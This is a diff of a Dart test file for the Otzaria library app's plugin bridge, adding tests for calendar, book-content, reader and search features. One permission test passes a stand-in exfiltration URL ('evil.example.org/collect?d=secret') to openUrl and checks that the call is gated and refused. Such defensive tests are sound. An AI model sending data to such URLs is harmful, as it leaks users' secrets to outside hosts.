@@ -12,6 +12,7 @@ import 'package:flutter_settings_screens/flutter_settings_screens.dart';
 import 'package:http/http.dart' as http;
 import 'package:http/testing.dart';
 import 'package:kosher_dart/kosher_dart.dart';
+import 'package:otzaria_report_contract/otzaria_report_contract.dart';
 import 'package:path/path.dart' as p;
 import 'package:mockito/mockito.dart';
 import 'package:otzaria/core/app_paths.dart';
@@ -25,6 +26,7 @@ import 'package:otzaria/models/book_source.dart';
 import 'package:otzaria/models/books.dart';
 import 'package:otzaria/models/links.dart';
 import 'package:otzaria/history/bloc/history_bloc.dart';
+import 'package:otzaria/history/bloc/history_state.dart';
 import 'package:otzaria/navigation/bloc/navigation_bloc.dart';
 import 'package:otzaria/personal_notes/repository/personal_notes_repository.dart';
 import 'package:otzaria/plugins/bridge/plugin_bridge_adapter.dart';
@@ -37,6 +39,8 @@ import 'package:otzaria/plugins/services/context_menu_registry.dart';
 import 'package:otzaria/plugins/services/plugin_condition_evaluator.dart';
 import 'package:otzaria/plugins/services/plugin_shortcut_registry.dart';
 import 'package:otzaria/plugins/services/plugin_toolbar_registry.dart';
+import 'package:otzaria/plugins/services/plugin_text_reader_registry.dart';
+import 'package:otzaria/plugins/models/plugin_book_identity.dart';
 import 'package:otzaria/plugins/services/plugin_network_access_resolver.dart';
 import 'package:otzaria/plugins/services/plugin_page_launcher.dart';
 import 'package:otzaria/plugins/services/plugin_runtime_dispatcher.dart';
@@ -46,7 +50,6 @@ import 'package:otzaria/plugins/services/plugin_file_server.dart';
 import 'package:otzaria/plugins/services/plugin_network_fetch_service.dart';
 import 'package:otzaria/core/user_state/pending_report_store.dart';
 import 'package:otzaria/core/user_state/user_state_database.dart';
-import 'package:otzaria/plugins/models/plugin_report_record.dart';
 import 'package:otzaria/plugins/services/plugin_report_service.dart';
 import 'package:otzaria/plugins/utils/reader_location_resolver.dart';
 import 'package:otzaria/search/models/search_configuration.dart';
@@ -62,13 +65,15 @@ import 'package:otzaria_search_engine/otzaria_search_engine.dart'
         SearchResult,
         SearchScope,
         SearchStreamUpdate,
-        WordMatchMode;
+        WordMatchMode,
+        TextStatus;
 import 'package:otzaria/tabs/bloc/tabs_bloc.dart';
 import 'package:otzaria/tabs/bloc/tabs_event.dart';
 import 'package:otzaria/tabs/bloc/tabs_state.dart';
 import 'package:otzaria/tabs/models/pdf_tab.dart';
 import 'package:otzaria/tabs/models/text_tab.dart';
 import 'package:otzaria/text_book/bloc/text_book_state.dart';
+import 'package:otzaria/text_display/text_display_exports.dart';
 import 'package:otzaria/tools/calendar/bloc/calendar_cubit.dart';
 import 'package:otzaria/utils/navigation/book_open_coordinator.dart';
 import 'package:otzaria/workspaces/bloc/workspace_bloc.dart';
@@ -76,6 +81,7 @@ import 'package:otzaria/tabs/models/searching_tab.dart';
 import 'package:otzaria/tabs/models/tab.dart';
 
 import '../../support/search_engine_test_init.dart';
+import '../../test_helpers/dst_days.dart';
 
 class _MockHistoryBloc extends Mock implements HistoryBloc {}
 
@@ -130,119 +136,44 @@ class _StubSearchRepository extends SearchRepository {
   int pageCalls = 0;
   int streamWithCountsCalls = 0;
   Stream<SearchStreamUpdate>? streamOverride;
+  List<SearchResult> fullTextResults = const [];
 
-  void _capture(
-    String query,
-    List<String> facets,
-    int limit, {
-    required int offset,
-    required ResultsOrder order,
-    required SearchMode searchMode,
-    required int distance,
-    required SearchScope scope,
-    required ResultGrouping? grouping,
-    required WordMatchMode wordMatchMode,
-    required Map<String, Map<String, bool>>? searchOptions,
-  }) {
+  @override
+  Future<List<SearchResult>> searchTexts(SearchEngineRequest request) async =>
+      fullTextResults;
+
+  void _capture(SearchEngineRequest request) {
     captured = {
-      'query': query,
-      'facets': facets,
-      'limit': limit,
-      'offset': offset,
-      'order': order,
-      'searchMode': searchMode,
-      'distance': distance,
-      'scope': scope,
-      'grouping': grouping,
-      'wordMatchMode': wordMatchMode,
-      'searchOptions': searchOptions,
+      'query': request.query,
+      'facets': request.facets,
+      'limit': request.limit,
+      'offset': request.offset,
+      'order': request.order,
+      'searchMode': request.searchMode,
+      'distance': request.distance,
+      'scope': request.scope,
+      'grouping': request.grouping,
+      'wordMatchMode': request.wordMatchMode,
+      'searchOptions': request.searchOptions,
     };
   }
 
   @override
   Future<SearchPageResult> searchTextsAndCount(
-    String query,
-    List<String> facets,
-    int limit, {
-    int offset = 0,
-    ResultsOrder order = ResultsOrder.relevance,
-    bool fuzzy = false,
-    int distance = 0,
-    String negativeQuery = '',
-    int? negativeDistance,
-    SearchScope scope = SearchScope.wordDistance,
-    SearchScope? negativeScope,
-    SearchMode searchMode = SearchMode.exact,
-    Map<String, String>? customSpacing,
-    Map<String, String>? negativeCustomSpacing,
-    Map<int, List<String>>? alternativeWords,
-    Map<int, List<String>>? negativeAlternativeWords,
-    Map<String, Map<String, bool>>? searchOptions,
-    Map<String, Map<String, bool>>? negativeSearchOptions,
-    bool matchNikud = false,
-    bool matchTaamim = false,
-    ResultGrouping? grouping,
-    WordMatchMode wordMatchMode = WordMatchMode.all,
-    int? wordMatchCount,
-  }) async {
+    SearchEngineRequest request,
+  ) async {
     pageCalls++;
-    _capture(
-      query,
-      facets,
-      limit,
-      offset: offset,
-      order: order,
-      searchMode: searchMode,
-      distance: distance,
-      scope: scope,
-      grouping: grouping,
-      wordMatchMode: wordMatchMode,
-      searchOptions: searchOptions,
-    );
+    _capture(request);
     return pageResult;
   }
 
   @override
   Stream<SearchStreamUpdate> searchTextsStreamWithCounts(
-    String query,
-    List<String> facets,
-    int limit, {
-    int offset = 0,
+    SearchEngineRequest request, {
     int chunkSize = 50,
-    ResultsOrder order = ResultsOrder.relevance,
-    bool fuzzy = false,
-    int distance = 0,
-    String negativeQuery = '',
-    int? negativeDistance,
-    SearchScope scope = SearchScope.wordDistance,
-    SearchScope? negativeScope,
-    SearchMode searchMode = SearchMode.exact,
-    Map<String, String>? customSpacing,
-    Map<String, String>? negativeCustomSpacing,
-    Map<int, List<String>>? alternativeWords,
-    Map<int, List<String>>? negativeAlternativeWords,
-    Map<String, Map<String, bool>>? searchOptions,
-    Map<String, Map<String, bool>>? negativeSearchOptions,
-    bool matchNikud = false,
-    bool matchTaamim = false,
-    ResultGrouping? grouping,
-    WordMatchMode wordMatchMode = WordMatchMode.all,
-    int? wordMatchCount,
   }) {
     streamWithCountsCalls++;
-    _capture(
-      query,
-      facets,
-      limit,
-      offset: offset,
-      order: order,
-      searchMode: searchMode,
-      distance: distance,
-      scope: scope,
-      grouping: grouping,
-      wordMatchMode: wordMatchMode,
-      searchOptions: searchOptions,
-    );
+    _capture(request);
     return streamOverride ?? Stream.fromIterable(updates);
   }
 }
@@ -251,6 +182,32 @@ class _MockPersonalNotesRepository extends Mock
     implements PersonalNotesRepository {}
 
 class _MockBookOpenCoordinator extends Mock implements BookOpenCoordinator {}
+
+class _ReaderHistoryBloc extends _MockHistoryBloc {
+  @override
+  HistoryState get state => HistoryLoaded([]);
+}
+
+class _RecordingReaderCoordinator extends BookOpenCoordinator {
+  _RecordingReaderCoordinator(TabsBloc tabsBloc)
+    : super(
+        tabsBloc: tabsBloc,
+        historyBloc: _ReaderHistoryBloc(),
+        navigationBloc: _MockNavigationBloc(),
+      );
+  OpenedTab? opened;
+  bool navigate = false;
+  @override
+  void openTab(
+    OpenedTab tab, {
+    bool insertAdjacent = false,
+    bool navigateToPositionIfReused = false,
+    bool inSidePane = false,
+  }) {
+    opened = tab;
+    navigate = navigateToPositionIfReused;
+  }
+}
 
 class _StubPluginRegistryRepository extends PluginRegistryRepository {
   List<PluginPermissionGrant> permissions = [];
@@ -495,6 +452,12 @@ Future<void> main() async {
       expect(response['isLeapYear'], jewishCalendar.isJewishLeapYear());
       expect(response['isShabbat'], jewishCalendar.getDayOfWeek() == 7);
 
+      final daf = jewishCalendar.getDafYomiBavli();
+      expect(response['dafYomi'], {
+        'masechet': daf.getMasechta(),
+        'daf': daf.getDaf(),
+      });
+
       final holidays = (response['holidays'] as List<dynamic>)
           .cast<Map<String, String>>();
       expect(
@@ -507,6 +470,57 @@ Future<void> main() async {
         ),
       );
     });
+
+    test(
+      'dafYomi matches the known Daf Yomi Bavli cycle (10 Elul 5777 → Sanhedrin 47)',
+      () async {
+        final jewishDate = JewishDate()
+          ..setJewishDate(5777, JewishDate.ELUL, 10);
+        final state = _buildCalendarState(
+          jewishDate.getGregorianCalendar(),
+          inIsrael: true,
+        );
+        calendarCubit.currentState = state;
+
+        final response =
+            await adapter.execute('calendar', 'getJewishDate', {})
+                as Map<String, dynamic>;
+
+        expect(response['dafYomi'], {'masechet': 'סנהדרין', 'daf': 47});
+      },
+    );
+
+    test('dafYomi is null before the first Daf Yomi cycle started', () async {
+      final state = _buildCalendarState(DateTime(1900, 1, 1), inIsrael: true);
+      calendarCubit.currentState = state;
+
+      final response =
+          await adapter.execute('calendar', 'getJewishDate', {})
+              as Map<String, dynamic>;
+
+      expect(response['dafYomi'], isNull);
+    });
+
+    test(
+      'parasha does not depend on the hour on the day clocks fall back',
+      skip: noDstSkipReason,
+      () async {
+        final day = localDayLasting(25)!;
+        final shabbat = JewishCalendar.fromDateTime(shabbatOnOrAfter(day))
+          ..inIsrael = true;
+        final expected = (HebrewDateFormatter()..hebrewFormat = true)
+            .formatParsha(
+              shabbat,
+            );
+        Future<Object?> parashaAt(DateTime date) async =>
+            (await adapter.execute('calendar', 'getJewishDate', {
+                  'date': date.toIso8601String(),
+                })
+                as Map<String, dynamic>)['parasha'];
+        expect(await parashaAt(atHour(day, 12)), expected);
+        expect(await parashaAt(atHour(day, 0, 30)), expected);
+      },
+    );
 
     test('returns rosh chodesh entries with correct kind', () async {
       final jewishDate = JewishDate()
@@ -1047,6 +1061,44 @@ Future<void> main() async {
         ),
       );
     });
+
+    test(
+      'app.openUrl ליעד שאינו מותר לתוסף ברשת מבקש אישור, וסירוב אינו פותח',
+      () async {
+        final prompts = <String>[];
+        final gated = PluginBridgeAdapter(
+          _buildInstalledPlugin(permissions: const ['app.open_url']),
+          dependencies: PluginBridgeDependencies(
+            historyBloc: _MockHistoryBloc(),
+            tabsBloc: _StubTabsBloc(),
+            navigationBloc: _MockNavigationBloc(),
+            calendarCubit: _StubCalendarCubit(
+              _buildCalendarState(DateTime(2026, 1, 1), inIsrael: true),
+            ),
+            workspaceBloc: _MockWorkspaceBloc(),
+            searchRepository: _MockSearchRepository(),
+            personalNotesRepository: _MockPersonalNotesRepository(),
+            bookOpenCoordinator: _MockBookOpenCoordinator(),
+            themePayloadBuilder: () => <String, dynamic>{},
+            showConfirmDialog: ({required title, required content}) async {
+              prompts.add(content);
+              return false;
+            },
+            showWarningDialog:
+                ({required title, required content, required subtitle}) async =>
+                    true,
+          ),
+          pluginRepository: _StubPluginRegistryRepository(),
+        );
+
+        final result = await gated.execute('app', 'openUrl', {
+          'url': 'https://evil.example.org/collect?d=secret',
+        });
+
+        expect(result, isFalse);
+        expect(prompts.single, contains('evil.example.org'));
+      },
+    );
 
     test(
       'reader.getCurrentRef returns current reference for active pdf tab',
@@ -1607,6 +1659,29 @@ Future<void> main() async {
     late PluginBridgeAdapter adapter;
     late _FakeBookProvider fakeProvider;
 
+    PluginBridgeAdapter readerAdapter(TextBookTab tab) => PluginBridgeAdapter(
+      _buildInstalledPlugin(permissions: const ['library.read']),
+      readerTab: tab,
+      dependencies: PluginBridgeDependencies(
+        historyBloc: _MockHistoryBloc(),
+        tabsBloc: _StubTabsBloc(),
+        navigationBloc: _MockNavigationBloc(),
+        calendarCubit: _StubCalendarCubit(
+          _buildCalendarState(DateTime(2026, 1, 1), inIsrael: true),
+        ),
+        workspaceBloc: _MockWorkspaceBloc(),
+        searchRepository: _MockSearchRepository(),
+        personalNotesRepository: _MockPersonalNotesRepository(),
+        bookOpenCoordinator: _MockBookOpenCoordinator(),
+        themePayloadBuilder: () => {},
+        showConfirmDialog: ({required title, required content}) async => true,
+        showWarningDialog:
+            ({required title, required content, required subtitle}) async =>
+                true,
+      ),
+      pluginRepository: _StubPluginRegistryRepository(),
+    );
+
     setUp(() {
       // 1. הזרקת ספריית קטלוג מותאמת: TextBook עם fileType='docx' (מקרה הבאג),
       //    TextBook עם fileType='txt' (לוודא שגם הדרך הרגילה עובדת), ו-PdfBook
@@ -1725,6 +1800,169 @@ Future<void> main() async {
     tearDown(() {
       LibraryProviderManager.instance.resetForTesting();
     });
+
+    test(
+      'bound book absent from visible catalog retains identity and display source lines',
+      () async {
+        const raw = 'אָב<br>גָד,\nשָׁלוֹם\nדף ב';
+        final book = TextBook(title: 'מוסתר', categoryId: 501, id: 777);
+        final key = BookCompositeKey.create(
+          title: book.title,
+          categoryId: 501,
+          fileType: 'txt',
+        );
+        final provider = _FakeBookProvider({key: raw});
+        LibraryProviderManager.instance.seedMappingsForTesting(
+          mapping: {key: provider},
+          providers: [provider],
+        );
+        final tab = TextBookTab(book: book, index: 0);
+        addTearDown(tab.dispose);
+        tab.bloc.emit(
+          TextBookLoaded.initial(
+            book: book,
+            index: 0,
+            showLeftPane: false,
+            splitView: false,
+          ).copyWith(removeNikud: true, removePunctuation: true),
+        );
+        final boundAdapter = readerAdapter(tab);
+        final identity = PluginBookIdentity.toJsonWithUid(book);
+        expect(
+          await boundAdapter.execute('library', 'getBookContent', {
+            ...identity,
+            'limit': 5000,
+          }),
+          raw,
+        );
+        final display =
+            await boundAdapter.execute('library', 'getBookContent', {
+                  ...identity,
+                  'limit': 5000,
+                  'textReaderDisplay': true,
+                })
+                as String;
+        expect(display.split('\n'), hasLength(3));
+        expect(display.split('\n')[1], 'שלום');
+        expect(display.split('\n')[2], 'דף ב');
+        expect(display.split('\n').first, 'אב גד');
+        final fragments = <String>[];
+        for (var offset = 0; offset < display.length; offset += 3) {
+          fragments.add(
+            await boundAdapter.execute('library', 'getBookContent', {
+                  ...identity,
+                  'offset': offset,
+                  'limit': 3,
+                  'textReaderDisplay': true,
+                })
+                as String,
+          );
+        }
+        expect(fragments.join(), display);
+        tab.bloc.emit(
+          (tab.bloc.state as TextBookLoaded).copyWith(removeNikud: false),
+        );
+        final vocalized =
+            await boundAdapter.execute('library', 'getBookContent', {
+                  ...identity,
+                  'limit': 5000,
+                  'textReaderDisplay': true,
+                })
+                as String;
+        expect(vocalized, contains('שָׁלוֹם'));
+        expect(vocalized.split('\n'), hasLength(3));
+      },
+    );
+
+    test(
+      'display conversion yields and concurrent profiles retain their own content',
+      () async {
+        final raw = List.filled(5000, 'אָב, שָׁלוֹם יהוה<br>סוף').join('\n');
+        final book = TextBook(title: 'מקביל', categoryId: 502, id: 778);
+        final key = BookCompositeKey.create(
+          title: book.title,
+          categoryId: 502,
+          fileType: 'txt',
+        );
+        final provider = _FakeBookProvider({key: raw});
+        LibraryProviderManager.instance.seedMappingsForTesting(
+          mapping: {key: provider},
+          providers: [provider],
+        );
+        final tab = TextBookTab(book: book, index: 0);
+        addTearDown(tab.dispose);
+        final loaded = TextBookLoaded.initial(
+          book: book,
+          index: 0,
+          showLeftPane: false,
+          splitView: false,
+        );
+        tab.bloc.emit(
+          loaded.copyWith(removeNikud: true, removePunctuation: true),
+        );
+        final boundAdapter = readerAdapter(tab);
+        addTearDown(boundAdapter.dispose);
+        final identity = PluginBookIdentity.toJsonWithUid(book);
+        await boundAdapter.execute('library', 'getBookContent', {
+          ...identity,
+          'limit': 1,
+        });
+        final request = {...identity, 'limit': 5000, 'textReaderDisplay': true};
+        var firstCompleted = false;
+        final first = boundAdapter
+            .execute('library', 'getBookContent', request)
+            .then((value) {
+              firstCompleted = true;
+              return value;
+            });
+        await Future<void>.delayed(Duration.zero);
+        expect(
+          firstCompleted,
+          isFalse,
+          reason: 'conversion must let the UI event loop advance',
+        );
+        tab.bloc.emit(loaded);
+        final second = boundAdapter.execute(
+          'library',
+          'getBookContent',
+          request,
+        );
+        final sameProfile = boundAdapter.execute(
+          'library',
+          'getBookContent',
+          request,
+        );
+        final results = await Future.wait([first, second, sameProfile]);
+        String expected(TextDisplayProfile profile) => raw
+            .split('\n')
+            .map(
+              (line) => applyTextDisplayProfile(
+                line,
+                profile,
+              ).replaceAll('\n', '<br>'),
+            )
+            .join('\n')
+            .substring(0, 5000);
+        expect(
+          results[0],
+          expected(
+            loaded
+                .copyWith(removeNikud: true, removePunctuation: true)
+                .bodyDisplayProfile,
+          ),
+        );
+        expect(results[1], expected(loaded.bodyDisplayProfile));
+        expect(results[0], isNot(contains('אָב')));
+        expect(results[0], isNot(contains(',')));
+        expect(results[1], contains('אָב, שָׁלוֹם'));
+        expect(results[2], results[1]);
+        expect(
+          results.every((result) => !(result as String).contains('יהוה')),
+          isTrue,
+        );
+        expect((results[1] as String).split('\n').length, greaterThan(1));
+      },
+    );
 
     test('זורק כש-bookId חסר', () async {
       expect(
@@ -4121,6 +4359,7 @@ Future<void> main() async {
       List<OpenedTab> tabs = const [],
       int currentTabIndex = 0,
       SearchRepository? searchRepository,
+      BookOpenCoordinator? readerCoordinator,
     }) {
       tabsBloc = _StubTabsBloc();
       if (tabs.isNotEmpty) {
@@ -4157,7 +4396,7 @@ Future<void> main() async {
           workspaceBloc: _MockWorkspaceBloc(),
           searchRepository: searchRepository ?? _MockSearchRepository(),
           personalNotesRepository: _MockPersonalNotesRepository(),
-          bookOpenCoordinator: mockCoordinator,
+          bookOpenCoordinator: readerCoordinator ?? mockCoordinator,
           themePayloadBuilder: () => <String, dynamic>{},
           showConfirmDialog: ({required title, required content}) async => true,
           showWarningDialog:
@@ -4193,6 +4432,8 @@ Future<void> main() async {
                   filePath: 'id:10',
                   mergedCount: 1,
                   merged: const <MergedSibling>[],
+                  textStatus: TextStatus.ok,
+                  continuesToNextLine: false,
                 ),
               ],
               truncated: false,
@@ -4247,6 +4488,7 @@ Future<void> main() async {
         expect(hit['id'], 10);
         expect(hit['type'], 'text');
         expect(hit['index'], 12);
+        expect(hit['textStatus'], 'ok');
         expect(hit['reference'], 'בראשית, פרק א');
         expect((chunks.first['bookCounts'] as List).single, {
           'id': 10,
@@ -4500,6 +4742,50 @@ Future<void> main() async {
     });
 
     // --- reader.openBook ---
+    test(
+      'native escape preserves source, position and global default while overriding only the matching book',
+      () async {
+        final registry = PluginTextReaderRegistry.instance;
+        final selected = _buildInstalledPlugin(
+          permissions: PluginTextReaderRegistry.requiredPermissions.toList(),
+        );
+        await registry.select(selected, true);
+        addTearDown(() => registry.select(selected, false));
+        final book = TextBook(
+          id: 10,
+          title: 'בראשית',
+          source: BookSource.attached('test-library'),
+        );
+        final bound = TextBookTab(book: book, index: 3);
+        final official = TextBookTab(
+          book: TextBook(id: 10, title: 'בראשית'),
+          index: 2,
+        );
+        addTearDown(bound.dispose);
+        addTearDown(official.dispose);
+        final coordinator = _RecordingReaderCoordinator(_StubTabsBloc());
+        final adapter = buildAdapter(
+          books: [book, official.book],
+          tabs: [bound, official],
+          readerCoordinator: coordinator,
+        );
+        final result = await adapter.execute('reader', 'openBook', {
+          'bookUid': PluginBookIdentity.uidOf(book),
+          'index': 42,
+          'reader': 'native',
+        });
+        expect(result, true);
+        expect(coordinator.navigate, true);
+        final opened = coordinator.opened as TextBookTab;
+        addTearDown(opened.dispose);
+        expect(opened.book.source, BookSource.attached('test-library'));
+        expect(opened.index, 42);
+        expect(registry.usesPlugin(opened), false);
+        expect(registry.usesPlugin(bound), false);
+        expect(registry.usesPlugin(official), true);
+        expect(registry.selectedPluginId, selected.pluginId);
+      },
+    );
 
     test('reader.openBook פותח לפי id בלבד', () async {
       final book = TextBook(id: 5, title: 'ויקרא');
@@ -4730,6 +5016,39 @@ Future<void> main() async {
 
       expect(result['currentId'], isNull);
       expect(result['currentType'], isNull);
+    });
+
+    test('search.fullText מחזיר את מצב הטקסט של כל תוצאה', () async {
+      SearchResult hit(int i, String text, TextStatus status) => SearchResult(
+        title: 'ספר $i',
+        reference: 'פרק $i',
+        text: text,
+        id: BigInt.from(i),
+        segment: BigInt.from(i),
+        isPdf: false,
+        filePath: 'id:$i',
+        mergedCount: 1,
+        merged: const <MergedSibling>[],
+        textStatus: status,
+        continuesToNextLine: false,
+      );
+      final stub = _StubSearchRepository()
+        ..fullTextResults = [
+          hit(1, 'שורה', TextStatus.ok),
+          hit(2, 'שורה חדשה', TextStatus.stale),
+          hit(3, '', TextStatus.unavailable),
+        ];
+      final adapter = buildAdapter(books: const [], searchRepository: stub);
+
+      final results =
+          await adapter.execute('search', 'fullText', {'query': 'שורה'})
+              as List;
+
+      expect(
+        [for (final result in results) (result as Map)['textStatus']],
+        ['ok', 'stale', 'unavailable'],
+      );
+      expect((results.last as Map)['text'], '');
     });
 
     test('search.fullText אינו מחזיר id — type תלוי ב-isPdf', () {
